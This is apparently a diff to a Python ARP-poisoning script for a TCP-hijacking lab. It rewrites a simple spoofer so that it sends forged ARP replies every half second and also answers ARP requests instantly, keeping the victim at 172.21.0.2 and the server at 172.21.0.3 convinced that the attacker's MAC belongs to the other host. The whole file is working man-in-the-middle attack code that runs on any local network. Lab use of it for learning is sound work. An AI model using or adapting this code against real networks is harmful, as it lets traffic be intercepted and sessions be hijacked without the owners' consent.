@@ -1,45 +1,75 @@
 #!/usr/bin/env python3
-"""ARP spoofing giua victim (172.21.0.2) va server (172.21.0.3).
-Khien ca hai ngoai MAC cua attacker la cua nhau, de sniff phien TCP."""
+"""Reliable ARP spoofing for the TCP hijacking labs.
+
+The attacker answers ARP requests for the victim/server immediately and also
+sends periodic gratuitous replies, so the victim and server keep the attacker
+MAC in their neighbour caches.
+
+Usage:  sudo ./arp-poison [iface]
+"""
 
 import socket
 import struct
 import sys
+import threading
 import time
 
-VICTIM = '172.21.0.2'
-SERVER = '172.21.0.3'
+# claimed_ip -> list of hosts that should believe claimed_ip is at our MAC
+CLAIMS = {
+    '172.21.0.3': ['172.21.0.2'],   # victim thinks the server is us
+    '172.21.0.2': ['172.21.0.3'],   # server thinks the victim is us
+}
+
 
 def get_mac(iface):
-    with open('/sys/class/net/%s/address' % iface) as f:
-        return f.read().strip()
+    with open('/sys/class/net/%s/address' % iface) as fh:
+        return fh.read().strip()
 
-def mac_bytes(s):
-    return struct.pack('!6s', b''.join(bytes([int(p, 16)]) for p in s.split(':')))
 
-def arp_reply(src_ip, dst_ip, src_mac, dst_mac):
-    eth = struct.pack('!6s6sH', dst_mac, src_mac, 0x0806)
+def mac_bytes(text):
+    return b''.join(bytes([int(part, 16)]) for part in text.split(':'))
+
+
+def make_reply(claimed_ip, dst_ip, mymac, dst_mac):
+    eth = struct.pack('!6s6sH', dst_mac, mymac, 0x0806)
     arp = struct.pack('!HHBBH6s4s6s4s', 1, 0x0800, 6, 4, 2,
-                      src_mac, socket.inet_aton(src_ip),
+                      mymac, socket.inet_aton(claimed_ip),
                       dst_mac, socket.inet_aton(dst_ip))
     return eth + arp
+
 
 def main():
     iface = sys.argv[1] if len(sys.argv) > 1 else 'eth0'
     mymac = mac_bytes(get_mac(iface))
     bcast = mac_bytes('ff:ff:ff:ff:ff:ff')
-    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-    s.bind((iface, 0))
-    print('ARP poisoning %s <-> %s qua %s' % (VICTIM, SERVER, iface), flush=True)
-    try:
+    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+    sock.bind((iface, 0))
+    print('ARP poisoning on %s, attacker MAC %s' % (iface, get_mac(iface)), flush=True)
+
+    def sender():
         while True:
-            # noi victim: server o MAC cua attacker
-            s.send(arp_reply(SERVER, VICTIM, mymac, bcast))
-            # noi server: victim o MAC cua attacker
-            s.send(arp_reply(VICTIM, SERVER, mymac, bcast))
-            time.sleep(1)
-    except KeyboardInterrupt:
-        pass
+            for claimed, victims in CLAIMS.items():
+                for victim in victims:
+                    sock.send(make_reply(claimed, victim, mymac, bcast))
+            time.sleep(0.5)
+
+    threading.Thread(target=sender, daemon=True).start()
+
+    while True:
+        frame = sock.recv(2048)
+        if len(frame) < 42:
+            continue
+        if struct.unpack('!H', frame[12:14])[0] != 0x0806:
+            continue
+        fields = struct.unpack('!HHBBH6s4s6s4s', frame[14:42])
+        op, sha, spa, tpa = fields[4], fields[5], fields[6], fields[8]
+        if op != 1:
+            continue
+        claimed = socket.inet_ntoa(tpa)
+        asker = socket.inet_ntoa(spa)
+        if claimed in CLAIMS and asker in CLAIMS[claimed]:
+            sock.send(make_reply(claimed, asker, mymac, sha))
+
 
 if __name__ == '__main__':
     main()
